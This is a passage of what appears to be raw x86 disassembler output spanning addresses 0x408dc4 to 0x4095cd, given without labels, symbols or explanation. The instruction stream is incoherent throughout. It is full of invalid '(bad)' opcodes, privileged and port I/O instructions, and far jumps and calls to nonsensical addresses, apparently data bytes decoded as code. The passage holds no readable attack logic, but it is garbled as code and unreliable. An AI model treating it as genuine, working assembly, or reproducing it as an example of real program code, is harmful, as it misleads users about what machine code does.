  408dc4:	inc    si
  408dc6:	lods   al,BYTE PTR ds:[esi]
  408dc7:	mul    dl
  408dc9:	inc    ebp
  408dca:	mov    ebx,esi
  408dcc:	leave  
  408dcd:	mov    esi,0xb7f7dc56
  408dd2:	rol    BYTE PTR [eax+0x7b19a5d3],0x11
  408dd9:	loopne 0x408de7
  408ddb:	mov    ebx,0xeb713eb2
  408de0:	mov    ds:0xa0e78c0b,eax
  408de5:	lods   eax,DWORD PTR ds:[esi]
  408de6:	fwait
  408de7:	aam    0x56
  408de9:	cmp    edi,DWORD PTR [eax]
  408deb:	leave  
  408dec:	xchg   DWORD PTR [ebx],esp
  408dee:	xor    al,0x34
  408df0:	jae    0x408d88
  408df2:	push   0x2551ed49
  408df7:	push   ss
  408df8:	push   esp
  408df9:	retf   
  408dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dfb:	sbb    DWORD PTR [edi-0x53],esi
  408dfe:	mov    esi,0x4a73c8f6
  408e03:	aaa    
  408e04:	add    DWORD PTR [ebx-0x44af4fce],esp
  408e0a:	dec    esp
  408e0b:	push   0x1ca8177d
  408e10:	test   DWORD PTR ds:0x36edadfe,ecx
  408e16:	repz js 0x408dbf
  408e19:	or     ebx,DWORD PTR [edx]
  408e1b:	add    DWORD PTR [edi+0x4a],0xcc5a7ceb
  408e22:	gs ja  0x408ea1
  408e25:	mov    ch,0xa3
  408e27:	inc    esp
  408e28:	daa    
  408e29:	adc    edx,DWORD PTR [ebp-0x8465775]
  408e2f:	and    BYTE PTR [ecx-0x75],ch
  408e32:	ret    
  408e33:	sbb    eax,0xc3fbfe74
  408e38:	cmc    
  408e39:	or     eax,esi
  408e3b:	xchg   ecx,eax
  408e3c:	cmp    dh,BYTE PTR [ebx-0x62]
  408e3f:	add    BYTE PTR [edi+0x7cc936a4],bl
  408e45:	ja     0x408ebb
  408e47:	lds    ebp,FWORD PTR [ebp-0x3ee39891]
  408e4d:	push   esi
  408e4e:	dec    eax
  408e4f:	sub    DWORD PTR [eax],ecx
  408e51:	and    WORD PTR [edi-0x34606fd4],0xffdf
  408e59:	jmp    0x408e9b
  408e5b:	pop    ss
  408e5c:	inc    ebp
  408e5d:	push   eax
  408e5e:	inc    BYTE PTR [bx+si+0x4868]
  408e63:	sub    DWORD PTR [ebp+0x31ced533],esi
  408e69:	ds mov dl,0xb3
  408e6c:	xor    eax,0x4708b38f
  408e71:	add    DWORD PTR [ebp-0x2d],esp
  408e74:	lock cld 
  408e76:	dec    edi
  408e77:	cwde   
  408e78:	ss (bad) 
  408e7a:	je     0x408e24
  408e7c:	pop    eax
  408e7d:	rcr    BYTE PTR ds:0x3bc224b1,cl
  408e83:	leave  
  408e84:	fidiv  DWORD PTR [edx-0x292399c1]
  408e8a:	test   DWORD PTR [eax+0x1daee030],esp
  408e90:	hlt    
  408e91:	xchg   ebx,eax
  408e92:	jmp    0x66c9e64f
  408e97:	out    0x7a,al
  408e99:	js     0x408e50
  408e9b:	jne    0x408e65
  408e9d:	push   esp
  408e9e:	lock iret 
  408ea0:	add    eax,0xeb8ad69e
  408ea5:	mov    bl,0xe3
  408ea7:	jne    0x408e79
  408ea9:	mov    ds:0x86bf8477,eax
  408eae:	out    dx,eax
  408eaf:	fxam   
  408eb1:	mov    eax,0xe9cbcfb8
  408eb6:	shr    DWORD PTR [ecx+0x789f33e1],1
  408ebc:	xor    eax,0x1a57f184
  408ec1:	mov    cl,0xa0
  408ec3:	xor    eax,DWORD PTR [ebp-0x6386bd5d]
  408ec9:	pop    eax
  408eca:	push   0xffffff98
  408ecc:	clc    
  408ecd:	fnsave [esi+0x2f]
  408ed0:	mov    bh,0x86
  408ed2:	les    esp,FWORD PTR [eax+0x2a3ba948]
  408ed8:	push   ss
  408ed9:	hlt    
  408eda:	test   al,0x5b
  408edc:	dec    esp
  408edd:	fincstp 
  408edf:	(bad)  
  408ee0:	hlt    
  408ee1:	jo     0x408f31
  408ee3:	sub    ch,ah
  408ee5:	loop   0x408ec4
  408ee7:	push   gs
  408ee9:	xchg   esi,eax
  408eea:	clc    
  408eeb:	fcomip st,st(0)
  408eed:	lods   al,BYTE PTR ds:[esi]
  408eee:	cmp    ecx,DWORD PTR [ebx-0x6d51b7c1]
  408ef4:	mov    ds:0x20769422,al
  408ef9:	xlat   BYTE PTR ds:[ebx]
  408efa:	xor    edi,DWORD PTR [edi-0x71b7c13a]
  408f00:	data16 add BYTE PTR [eax-0x6d],cl
  408f04:	mov    bl,0x38
  408f06:	xchg   edi,eax
  408f07:	add    DWORD PTR [edx*8+0x22352185],ecx
  408f0e:	lods   al,BYTE PTR ds:[esi]
  408f0f:	sar    esi,0x42
  408f12:	fsubr  DWORD PTR [ebx]
  408f14:	pop    ebp
  408f15:	xchg   esp,eax
  408f16:	lea    esp,[ebp+0x5ed8198]
  408f1c:	pop    edi
  408f1d:	inc    bx
  408f1f:	dec    edi
  408f20:	jmp    0x408f5a
  408f22:	dec    esp
  408f24:	inc    edx
  408f25:	jae    0x408f8d
  408f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f28:	sbb    BYTE PTR ds:0x341348a9,bh
  408f2e:	sub    ebx,DWORD PTR [edi-0x78]
  408f31:	push   es
  408f32:	aad    0x3e
  408f34:	jb     0x408efe
  408f36:	adc    bh,BYTE PTR [esi+0x75]
  408f39:	cmp    edx,edx
  408f3b:	and    bl,0xb6
  408f3e:	sub    al,BYTE PTR [edx+0x76bd6dcd]
  408f44:	push   es
  408f45:	mov    ebx,0x89c9c7b9
  408f4a:	xor    al,0x8a
  408f4c:	jmp    0xb3f84e33
  408f51:	sbb    eax,0xf9b33141
  408f56:	into   
  408f57:	data16 loop 0x408fcb
  408f5a:	es mov esi,0xaef3b8e9
  408f60:	adc    BYTE PTR [esi+0x39],dh
  408f63:	mov    ecx,0x3f0ff9b6
  408f68:	dec    ebp
  408f69:	test   al,0xd2
  408f6b:	sub    eax,0x67681b12
  408f70:	(bad)  
  408f71:	sbb    bh,BYTE PTR [ecx]
  408f73:	push   ds
  408f74:	mov    eax,0xd4f1a4a3
  408f79:	pop    edi
  408f7a:	dec    ebx
  408f7b:	cwde   
  408f7c:	mov    ds:0xf420fddc,eax
  408f81:	lahf   
  408f82:	ret    0xe759
  408f85:	pop    eax
  408f86:	jecxz  0x408f54
  408f88:	fadd   QWORD PTR [ebx+0xadd1f8]
  408f8e:	jmp    0x703b:0xf23377c1
  408f95:	mov    ebx,0xf2d52615
  408f9a:	or     ah,dh
  408f9c:	test   ebp,esi
  408f9e:	push   0xa54a46b8
  408fa3:	inc    edx
  408fa4:	loopne 0x408f61
  408fa6:	mov    dh,0xcd
  408fa8:	xor    bh,0x88
  408fab:	out    dx,al
  408fac:	xor    ebx,edi
  408fae:	test   eax,0xe109f4d5
  408fb3:	xor    esp,DWORD PTR [ecx+0x1eaabbc1]
  408fb9:	lods   al,BYTE PTR ds:[esi]
  408fba:	mov    BYTE PTR [edi-0x3],ah
  408fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fbe:	xchg   ebx,eax
  408fbf:	jne    0x40902d
  408fc1:	xor    al,0xa3
  408fc3:	xchg   ecx,eax
  408fc4:	fistp  QWORD PTR [ebp+0x3f]
  408fc7:	aaa    
  408fc8:	fstp   TBYTE PTR [edx-0x10b19d38]
  408fce:	enter  0x78f6,0xad
  408fd2:	imul   eax,DWORD PTR [edx],0xe0931c79
  408fd8:	loope  0x408fbf
  408fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fdb:	sub    al,0x7a
  408fdd:	lock lahf 
  408fdf:	sar    cl,cl
  408fe1:	shr    DWORD PTR [ecx+edi*2+0x41ea90c6],1
  408fe8:	fcomp  QWORD PTR [ebx-0x19]
  408feb:	add    ecx,DWORD PTR ds:0x3bff8de1
  408ff1:	sub    BYTE PTR [ebx+0xa9bbc63],al
  408ff7:	pop    ecx
  408ff8:	fidiv  DWORD PTR [eax-0x37]
  408ffb:	pusha  
  408ffc:	ret    0xa6e4
  408fff:	imul   esp,DWORD PTR [edx-0x46],0x46
  409003:	sbb    eax,0x808828e7
  409008:	or     esp,ecx
  40900a:	cmp    DWORD PTR [ebx+0x5aa4b553],ecx
  409010:	and    BYTE PTR [edx+eax*2-0x2],bh
  409014:	fcomp  QWORD PTR [eax]
  409016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409017:	mov    dh,0xb3
  409019:	pop    ss
  40901a:	loopne 0x40900c
  40901c:	sub    dh,bh
  40901e:	and    ebx,esp
  409020:	mov    eax,ds:0x6998519d
  409025:	dec    eax
  409026:	inc    ecx
  409027:	and    eax,0x9e09dfd
  40902c:	rcl    BYTE PTR [edi+ebx*4],1
  40902f:	pop    ds
  409030:	adc    eax,0x8dc7334a
  409035:	xor    cl,cl
  409037:	pop    ebp
  409038:	inc    ebx
  409039:	inc    ecx
  40903a:	mov    bh,bl
  40903c:	jp     0x409008
  40903e:	adc    al,0x68
  409040:	shl    DWORD PTR [ecx+0x37],0x36
  409044:	rol    DWORD PTR [edi],1
  409046:	jge    0x409039
  409048:	jb     0x409019
  40904a:	std    
  40904b:	call   ebx
  40904d:	mov    ah,0x97
  40904f:	ror    esp,0xf0
  409052:	mov    dh,0x1
  409054:	(bad)  
  409055:	mov    bl,0xc6
  409057:	fld    DWORD PTR [edx-0xc0fbc26]
  40905d:	setge  BYTE PTR ds:0x60dafaad
  409064:	in     eax,0x4d
  409066:	sbb    ah,ah
  409068:	push   DWORD PTR [edx-0x5e]
  40906b:	mov    ch,0x5e
  40906d:	fidivr WORD PTR [ebp+0x47]
  409070:	fnstenv [esi]
  409072:	xchg   BYTE PTR [ecx-0xc81c3b9],al
  409078:	lahf   
  409079:	add    edx,DWORD PTR [ecx+edi*2]
  40907c:	xchg   edi,eax
  40907d:	mov    al,0x44
  40907f:	(bad)  
  409081:	out    0x85,al
  409083:	(bad)  
  409084:	mov    ch,0xc8
  409086:	inc    ebx
  409087:	add    edx,DWORD PTR [ebx+0x4dff7950]
  40908d:	or     eax,0x2e4a292e
  409092:	push   cs
  409093:	leave  
  409094:	adc    ebx,0xe283bade
  40909a:	push   ebp
  40909b:	les    ebx,FWORD PTR [ebp+0x3]
  40909e:	iret   
  40909f:	jne    0x4090e1
  4090a1:	sub    cl,cl
  4090a3:	out    0xa4,al
  4090a5:	es jae 0x40910e
  4090a8:	cmp    dh,BYTE PTR [ecx]
  4090aa:	mov    ?,WORD PTR [edx-0x356dae66]
  4090b0:	sbb    cl,bl
  4090b2:	jmp    0x4090be
  4090b4:	cmp    eax,0x5888ab4b
  4090b9:	ds jb  0x4090f3
  4090bc:	pop    ecx
  4090bd:	sub    BYTE PTR [ebp+0x5e],cl
  4090c0:	shr    BYTE PTR [ebx+0x6ed5b16a],1
  4090c6:	(bad)  
  4090c7:	pop    edi
  4090c8:	inc    edi
  4090c9:	leave  
  4090ca:	in     eax,dx
  4090cb:	sbb    al,BYTE PTR ds:0x4ac888ab
  4090d1:	pop    ss
  4090d2:	imul   esi,DWORD PTR [esi+edi*8-0x41],0xffffffc8
  4090d7:	in     eax,dx
  4090d8:	adc    edx,DWORD PTR [edx-0x11e93c94]
  4090de:	sbb    bl,BYTE PTR [esi]
  4090e0:	leave  
  4090e1:	and    eax,0xf4722a3
  4090e6:	in     eax,dx
  4090e7:	ins    BYTE PTR es:[edi],dx
  4090e8:	xor    eax,0xe49aaf76
  4090ed:	adc    eax,0x7ca8aa43
  4090f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090f3:	push   esi
  4090f4:	cmc    
  4090f5:	mov    esp,0x7d3c97cc
  4090fa:	dec    esp
  4090fb:	std    
  4090fc:	xor    eax,0xc17e4ce0
  409101:	add    BYTE PTR [ebx-0x107f214],cl
  409107:	aaa    
  409108:	hlt    
  409109:	loop   0x4090d6
  40910b:	bound  esp,QWORD PTR [eax]
  40910d:	xchg   BYTE PTR [edi-0x370c3e6e],bh
  409113:	call   0x1cfcb6d4
  409118:	int    0x1c
  40911a:	aad    0xa7
  40911c:	mov    al,ds:0x57db3396
  409121:	jmp    0x409182
  409123:	push   ecx
  409124:	mov    cl,0xfd
  409126:	loope  0x409120
  409128:	in     al,0x4c
  40912a:	in     eax,dx
  40912b:	mov    ss,WORD PTR [esi+0x2bcab4ea]
  409131:	xor    al,0xb1
  409133:	lods   al,BYTE PTR ds:[esi]
  409134:	push   ecx
  409135:	sbb    BYTE PTR [edi+0x5e34dbae],dh
  40913b:	add    eax,0x5e56ae13
  409140:	mov    al,0x6c
  409142:	jns    0x40913e
  409144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409145:	mov    cl,0xab
  409147:	add    DWORD PTR [esi-0x4e],edx
  40914a:	inc    ebp
  40914b:	es push ecx
  40914d:	sbb    al,BYTE PTR [ebp+0x64]
  409150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409151:	rep stos BYTE PTR es:[edi],al
  409153:	mov    dh,0x31
  409155:	and    eax,0x492c8353
  40915a:	ins    BYTE PTR es:[edi],dx
  40915b:	pop    ebx
  40915c:	loop   0x40916b
  40915e:	sbb    DWORD PTR [edx-0x46],edi
  409161:	xchg   ebx,eax
  409162:	mov    ch,0x52
  409164:	sub    DWORD PTR [edi-0x5ae2977b],ebx
  40916a:	pop    esp
  40916b:	push   esi
  40916c:	(bad)  
  40916d:	xor    eax,0xa8eaaaca
  409172:	stos   DWORD PTR es:[edi],eax
  409173:	mov    esi,0x77ef6f09
  409178:	add    esp,DWORD PTR [ecx-0x61b8acc1]
  40917e:	out    0x7c,al
  409180:	cmp    BYTE PTR [edi-0x3accd3e5],cl
  409186:	jne    0x409207
  409188:	test   al,0x53
  40918a:	mov    ecx,0x10383365
  40918f:	les    ebp,FWORD PTR [esi]
  409191:	jnp    0x4091e3
  409193:	ss (bad) 
  409195:	mov    es,WORD PTR [edx]
  409197:	shl    BYTE PTR [eax-0x52],1
  40919a:	pusha  
  40919b:	(bad)  
  40919c:	mov    dl,0x1c
  40919e:	sbb    BYTE PTR [edx],al
  4091a0:	rol    BYTE PTR [edi+0x530967cc],0xce
  4091a7:	push   edx
  4091a8:	(bad)  
  4091a9:	jmp    0x40921e
  4091ab:	in     eax,dx
  4091ac:	les    edi,FWORD PTR [edi-0x29]
  4091af:	or     al,0x9a
  4091b1:	fisub  WORD PTR [eax-0x55]
  4091b4:	adc    bh,BYTE PTR ds:0xbea0677c
  4091ba:	mov    ebx,0xa2da21b5
  4091bf:	pop    esi
  4091c0:	cwde   
  4091c1:	jmp    0x383e:0xfa9bbb82
  4091c8:	scas   al,BYTE PTR es:[edi]
  4091c9:	idiv   DWORD PTR [ebp-0x62dc5e23]
  4091cf:	adc    esi,DWORD PTR [ebx]
  4091d1:	cmc    
  4091d2:	aaa    
  4091d3:	push   eax
  4091d4:	dec    edi
  4091d5:	pop    ss
  4091d6:	lea    esi,fs:[edx]
  4091d9:	xchg   ebx,eax
  4091da:	out    0xe9,al
  4091dc:	pop    ecx
  4091dd:	xor    DWORD PTR [edx+edx*4+0x460570af],esi
  4091e4:	sub    edx,DWORD PTR [esi-0x3d]
  4091e7:	ins    BYTE PTR es:[edi],dx
  4091e8:	outs   dx,DWORD PTR ds:[esi]
  4091e9:	mov    BYTE PTR [edx-0x75e1d3aa],0xe6
  4091f0:	rcl    ch,0x37
  4091f3:	mov    BYTE PTR [edi-0x55c08920],al
  4091f9:	xchg   ebp,eax
  4091fa:	add    ch,ah
  4091fc:	add    eax,0x435c8697
  409201:	lods   eax,DWORD PTR ds:[esi]
  409202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409203:	mov    ah,0x87
  409205:	scas   eax,DWORD PTR es:[edi]
  409206:	add    BYTE PTR [ebp+0x5b],ch
  409209:	push   eax
  40920a:	mov    ebp,0x770f450e
  40920f:	jae    0x40922a
  409211:	push   esp
  409212:	xor    esp,DWORD PTR [esi-0x40ebbce8]
  409218:	fbstp  TBYTE PTR [edi-0x304a97f6]
  40921e:	sub    cl,BYTE PTR [ecx-0x5d3d004]
  409224:	xor    eax,0x347c504a
  409229:	nop
  40922a:	mov    esp,0xa32e5a1c
  40922f:	xor    al,0x59
  409231:	fidiv  WORD PTR [ebx-0x55ce8a04]
  409237:	cdq    
  409238:	data16 cs mov al,0xb8
  40923c:	shl    BYTE PTR [esi],cl
  40923e:	sbb    eax,0x49feb7cf
  409243:	mov    DWORD PTR [eax],0x9f0515a2
  409249:	push   ss
  40924a:	xlat   BYTE PTR ds:[ebx]
  40924b:	add    al,0xa
  40924d:	xchg   esi,eax
  40924e:	stos   BYTE PTR es:[edi],al
  40924f:	les    ebp,FWORD PTR [eax-0x25]
  409252:	gs dec edi
  409254:	test   DWORD PTR [ebx-0x6659dfb1],ebx
  40925a:	fimul  WORD PTR [edi-0x46a021a3]
  409260:	int3   
  409261:	test   al,0x68
  409263:	ja     0x409256
  409265:	push   ecx
  409266:	int    0xed
  409268:	ins    DWORD PTR es:[edi],dx
  409269:	mov    ecx,0xf336d709
  40926e:	add    ch,dh
  409270:	jbe    0x4091fa
  409272:	call   0xe93c2572
  409277:	mov    edx,0xe90001a7
  40927c:	push   es
  40927d:	add    eax,0x3dca0000
  409282:	ds into 
  409284:	leave  
  409285:	int    0xda
  409287:	fldenv [esi+0x1ba228f9]
  40928d:	pushf  
  40928e:	imul   esp,DWORD PTR [edi],0x7878f53a
  409294:	push   0x7c
  409296:	js     0x409310
  409298:	test   eax,0xfe5cc973
  40929d:	lds    ebp,FWORD PTR [ebx-0x6332c450]
  4092a3:	lock jge 0x409238
  4092a6:	arpl   cx,di
  4092a8:	mov    WORD PTR [edi+0x7f],?
  4092ab:	and    dl,dh
  4092ad:	aaa    
  4092ae:	jmp    0x40924f
  4092b0:	scas   eax,DWORD PTR es:[edi]
  4092b1:	js     0x40925f
  4092b3:	shr    BYTE PTR [esi],0x82
  4092b6:	loopne 0x409298
  4092b8:	mov    ah,0xe0
  4092ba:	ror    DWORD PTR [eax-0xaea06b3],0x10
  4092c1:	sti    
  4092c2:	inc    edx
  4092c3:	mov    cs,WORD PTR [edx]
  4092c5:	call   0xd557:0xa25049cf
  4092cc:	sub    DWORD PTR [edi],esp
  4092ce:	xchg   ebp,eax
  4092cf:	imul   edi,DWORD PTR [edi],0xed255c07
  4092d5:	xchg   esp,eax
  4092d6:	add    ebp,DWORD PTR [eax-0x6e6d5842]
  4092dc:	and    eax,0x5c952063
  4092e1:	fst    st(1)
  4092e3:	inc    edi
  4092e4:	pop    ebp
  4092e5:	sbb    ah,bh
  4092e7:	in     al,0xef
  4092e9:	lds    esp,FWORD PTR ds:0xaae42b04
  4092ef:	mov    ebp,0xeccdbe52
  4092f4:	dec    eax
  4092f5:	sbb    al,0x8a
  4092f7:	(bad)  
  4092f8:	fwait
  4092f9:	pop    DWORD PTR [ebp+0x5]
  4092fc:	sahf   
  4092fd:	adc    DWORD PTR [edi],esi
  4092ff:	retf   0x883
  409302:	repz sti 
  409304:	ja     0x4092b2
  409306:	dec    ecx
  409307:	mov    ebp,0xdded1b42
  40930c:	dec    edx
  40930d:	adc    dl,0x99
  409310:	sahf   
  409311:	pop    ebp
  409312:	icebp  
  409313:	dec    edi
  409314:	lods   al,BYTE PTR ds:[esi]
  409315:	xchg   ebp,eax
  409316:	inc    ecx
  409317:	dec    esp
  409318:	add    DWORD PTR [ebx],ebp
  40931a:	in     al,0x82
  40931c:	xchg   ecx,eax
  40931d:	jb     0x4092e3
  40931f:	and    ebp,0xe96d4503
  409325:	(bad)  
  409326:	sti    
  409327:	sbb    BYTE PTR [ebx+0xab39770],0x33
  40932e:	jo     0x409346
  409330:	imul   BYTE PTR [edi+ebx*2]
  409333:	inc    edi
  409334:	jle    0x4092c4
  409336:	mov    BYTE PTR [ebx],ah
  409338:	xor    eax,0x88ec45cb
  40933d:	aas    
  40933e:	aam    0x49
  409340:	jns    0x409379
  409342:	(bad)  
  409344:	lods   al,BYTE PTR ds:[esi]
  409345:	cmp    BYTE PTR [edx+0x6fce9e60],dh
  40934b:	mov    dl,BYTE PTR ds:0x37d8e8d5
  409351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409352:	cmc    
  409353:	aaa    
  409354:	jns    0x409325
  409356:	jbe    0x40934e
  409358:	repz icebp 
  40935a:	scas   al,BYTE PTR es:[edi]
  40935b:	jl     0x409338
  40935d:	inc    esp
  40935e:	fwait
  40935f:	cmc    
  409360:	in     eax,0xd0
  409362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409363:	dec    ecx
  409364:	leave  
  409365:	orps   xmm6,XMMWORD PTR [ebp+ebp*2+0x62b3e477]
  40936d:	push   eax
  40936e:	mov    bl,0xbc
  409370:	push   eax
  409371:	push   esp
  409372:	jg     0x4093f2
  409374:	jmp    0xb525:0xeec9c642
  40937b:	ror    BYTE PTR [ebx],0x62
  40937e:	jge    0x4093dc
  409380:	and    edx,ecx
  409382:	adc    ah,BYTE PTR [ebx+0x2a960de0]
  409388:	in     al,0xe3
  40938a:	add    esi,DWORD PTR [eax]
  40938c:	mov    ds,WORD PTR [edi+0x4f]
  40938f:	test   BYTE PTR [edx+ebx*8],al
  409392:	rol    ebx,0xdc
  409395:	mov    cl,0x2e
  409397:	jle    0x4093b3
  409399:	pop    ecx
  40939a:	das    
  40939b:	lahf   
  40939c:	repz scas al,BYTE PTR es:[edi]
  40939e:	inc    edi
  40939f:	ins    DWORD PTR es:[edi],dx
  4093a0:	mov    al,ds:0x525afee7
  4093a5:	or     al,0x9d
  4093a7:	adc    ecx,DWORD PTR [esi]
  4093a9:	xchg   BYTE PTR [edx-0x79f2f8b6],bl
  4093af:	lods   al,BYTE PTR ds:[esi]
  4093b0:	xor    edi,eax
  4093b2:	lea    esi,[edx-0x1f]
  4093b5:	(bad)
  4093b8:	jge    0x40934e
  4093ba:	retf   0x28d
  4093bd:	std    
  4093be:	inc    esp
  4093bf:	xor    BYTE PTR [ebp-0x2c13da63],dh
  4093c5:	cli    
  4093c6:	mov    BYTE PTR [ebp-0x21],cl
  4093c9:	pop    ecx
  4093ca:	fxch   st(4)
  4093cc:	jne    0x4093a8
  4093ce:	inc    edx
  4093cf:	adc    al,0x35
  4093d1:	cli    
  4093d2:	repz sub al,0xf7
  4093d5:	sub    al,0xb5
  4093d7:	call   0x8bf0:0xae3039a
  4093de:	out    dx,eax
  4093df:	sub    al,BYTE PTR [eax-0x5b7c785b]
  4093e5:	fisubr DWORD PTR [ebp+0x6a]
  4093e8:	push   esp
  4093e9:	cmp    DWORD PTR [edx+eax*2-0x55faf1d0],ebp
  4093f0:	call   0x2e88:0x3e2f9f41
  4093f7:	sub    DWORD PTR [esi+0x66],edx
  4093fa:	push   ebx
  4093fb:	imul   edi,ebx,0x40
  4093fe:	stc    
  4093ff:	inc    ebx
  409400:	retfw  
  409402:	retf   
  409403:	(bad)  
  409404:	sub    al,0x93
  409406:	or     eax,0xba4d76e7
  40940b:	push   ecx
  40940c:	stos   BYTE PTR es:[edi],al
  40940d:	adc    al,BYTE PTR [ebp+0x2e]
  409410:	stc    
  409411:	stc    
  409412:	and    esi,ecx
  409414:	mov    dh,0xa
  409416:	mov    bl,BYTE PTR [esi-0x512a1411]
  40941c:	jo     0x409426
  40941e:	nop
  40941f:	sbb    al,0x26
  409421:	inc    ecx
  409422:	das    
  409423:	inc    esi
  409424:	fistp  WORD PTR [eax-0x210d69a4]
  40942a:	ja     0x409469
  40942c:	cmp    eax,0xaf551cca
  409431:	mov    ss,WORD PTR [eax+0x32]
  409434:	dec    edi
  409435:	les    edi,FWORD PTR [ecx-0x67]
  409438:	repnz retf 
  40943a:	iret   
  40943b:	iret   
  40943c:	mov    eax,DWORD PTR [edi-0x3bdfe3bf]
  409442:	fimul  DWORD PTR ds:0xe191c5ec
  409448:	fadd   st,st(5)
  40944a:	aad    0x8a
  40944c:	adc    DWORD PTR [esi+0x35],0x4b6284da
  409453:	mov    DWORD PTR [edx+eax*4],edi
  409456:	push   eax
  409457:	loope  0x409475
  409459:	sbb    BYTE PTR [ebp+edx*4-0x159d4b16],0x4
  409461:	out    0xd4,al
  409463:	pop    es
  409464:	and    BYTE PTR [ecx],dl
  409466:	pop    ds
  409467:	call   FWORD PTR [ebx]
  409469:	push   ds
  40946a:	push   DWORD PTR [edi+0x36]
  40946d:	cmp    DWORD PTR [ecx-0x6b935b6e],ebp
  409473:	mov    cl,0xb9
  409475:	pop    es
  409476:	jmp    0xa6aa:0xf65fadc8
  40947d:	addr16 mov eax,ds:0x79e4
  409481:	xchg   ebx,eax
  409482:	dec    ebx
  409483:	out    dx,eax
  409484:	lods   al,BYTE PTR ds:[esi]
  409485:	fstp   TBYTE PTR [edi]
  409487:	test   al,0x64
  409489:	mov    BYTE PTR [eax+0x5a],ah
  40948c:	mov    bh,0x3f
  40948e:	imul   eax,edi,0x462765d
  409494:	and    al,0x52
  409496:	ja     0x4094de
  409498:	push   cs
  409499:	clc    
  40949a:	test   al,ah
  40949c:	inc    ecx
  40949d:	add    esi,DWORD PTR [ecx-0xe]
  4094a0:	xchg   BYTE PTR [ecx+0x79],bl
  4094a3:	rol    BYTE PTR [esi],cl
  4094a5:	jecxz  0x4094b6
  4094a7:	data16 mov gs,WORD PTR [ebp+0x53]
  4094ab:	mov    dl,0x16
  4094ad:	add    edi,esi
  4094af:	and    eax,0x5775c747
  4094b4:	hlt    
  4094b5:	ins    DWORD PTR es:[edi],dx
  4094b6:	out    0x8c,al
  4094b8:	and    bl,bh
  4094ba:	ja     0x4094c7
  4094bc:	sbb    bh,BYTE PTR [esi+0x70]
  4094bf:	pop    ss
  4094c0:	cs mov bl,0xb6
  4094c3:	fisubr WORD PTR [ebx-0x2d39b34]
  4094c9:	or     ah,BYTE PTR [edx+0x57]
  4094cc:	xchg   edx,eax
  4094cd:	cwde   
  4094ce:	shl    DWORD PTR [esi+ebx*4],0x2c
  4094d2:	xor    BYTE PTR [ebx+ecx*8],cl
  4094d5:	and    al,0x94
  4094d7:	(bad)  
  4094d8:	mov    ds:0xd48d518e,eax
  4094dd:	mov    dl,0x9d
  4094df:	sbb    al,0xb5
  4094e1:	inc    eax
  4094e2:	sbb    al,0x91
  4094e4:	add    al,0x81
  4094e6:	and    al,0x2c
  4094e8:	loope  0x4094e5
  4094ea:	sbb    al,0xfa
  4094ec:	mov    WORD PTR ds:0xb707fe66,es
  4094f2:	inc    ebp
  4094f3:	mov    eax,ds:0xaa68e386
  4094f8:	retf   0x7449
  4094fb:	push   ecx
  4094fc:	pop    edx
  4094fd:	cwde   
  4094fe:	pop    ebx
  4094ff:	lea    ebp,[ebx-0x2103e27c]
  409505:	jns    0x4094ef
  409507:	jecxz  0x4094cf
  409509:	pop    edi
  40950a:	mov    edi,0xd3677367
  40950f:	and    eax,0x5ecab621
  409514:	jp     0x409583
  409516:	inc    ebp
  409517:	sub    eax,0xf497de27
  40951c:	shr    BYTE PTR [ecx],0x68
  40951f:	inc    ebx
  409520:	sub    esi,edx
  409522:	fimul  WORD PTR [ecx+ebp*8+0x6]
  409526:	push   ebp
  409527:	xor    al,0x1a
  409529:	add    ecx,ecx
  40952b:	dec    esi
  40952c:	xor    BYTE PTR [ebx-0x1bfabef7],0x71
  409533:	cld    
  409534:	fimul  DWORD PTR [ebx]
  409536:	cmc    
  409537:	fistp  DWORD PTR [edx+0x2ffa92dc]
  40953d:	call   0xe55c2c8b
  409542:	pop    edi
  409543:	mov    ch,0xec
  409545:	pop    ss
  409546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409547:	fwait
  409548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409549:	loopne 0x4095af
  40954b:	fwait
  40954c:	int3   
  40954d:	sbb    DWORD PTR [ebp+0xc],0x2
  409551:	ss jle 0x409550
  409554:	mov    dh,0x75
  409556:	and    eax,DWORD PTR [esi]
  409558:	xor    esp,DWORD PTR [ebp-0x16]
  40955b:	icebp  
  40955c:	push   ecx
  40955d:	mov    ah,0xa2
  40955f:	xor    DWORD PTR [ebp+0xcc5861d],ebx
  409565:	shr    cl,0xf3
  409568:	pushw  ds
  40956a:	add    ah,dh
  40956c:	adc    DWORD PTR [ecx-0x408471ff],eax
  409572:	adc    ah,BYTE PTR [ebx+0x5]
  409575:	xor    DWORD PTR [esi+eiz*2-0x19],edi
  409579:	mov    BYTE PTR [eax+0x782b0bfe],ch
  40957f:	and    edx,DWORD PTR [esi+edi*1+0x578ee1fa]
  409586:	xlat   BYTE PTR ds:[ebx]
  409587:	frstor [edi+0x72441f22]
  40958d:	pop    es
  40958e:	mov    eax,ds:0x1cbd9ebc
  409593:	sbb    bl,BYTE PTR [edi+0x23]
  409596:	ror    ebp,1
  409598:	(bad)  
  409599:	ficomp DWORD PTR [eax-0xfcc2eec]
  40959f:	sbb    edi,DWORD PTR [ebx-0x695e890f]
  4095a5:	leave  
  4095a6:	jnp    0x4095cf
  4095a8:	pop    ecx
  4095a9:	aad    0x6e
  4095ab:	aad    0x11
  4095ad:	clc    
  4095ae:	push   esi
  4095af:	mov    al,ds:0x9e029cde
  4095b4:	xor    cl,BYTE PTR ds:0x9238dcbd
  4095ba:	jne    0x4095e9
  4095bc:	pop    eax
  4095bd:	push   ecx
  4095be:	inc    ecx
  4095bf:	dec    eax
  4095c0:	les    ebp,FWORD PTR [edi+0x17]
  4095c3:	arpl   ax,bx
  4095c5:	clc    
  4095c6:	fcmovne st,st(4)
  4095c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c9:	lock xchg edi,eax
  4095cb:	in     eax,dx
  4095cc:	(bad)  
  4095cd:	jg     0x40959c
